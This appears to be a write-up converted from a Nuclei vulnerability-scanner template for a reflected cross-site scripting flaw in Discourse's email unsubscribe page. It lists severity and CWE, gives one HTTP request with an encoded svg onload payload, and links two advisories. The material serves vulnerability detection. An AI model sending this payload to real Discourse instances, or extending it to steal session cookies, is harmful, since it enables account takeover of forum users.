# Nuclei Template: Discourse - Cross-Site Scripting
**Template ID:** discourse-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`discourse-xss.yaml`)

## Vulnerability Information & PoC

## Description
Discourse contains a cross-site scripting vulnerability. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
```

## References
- https://www.cvedetails.com/vulnerability-list/vendor_id-20185/product_id-57316/opxss-1/Discourse-Discourse.html
- https://github.com/discourse/discourse/security/advisories/GHSA-xhmc-9jwm-wqph
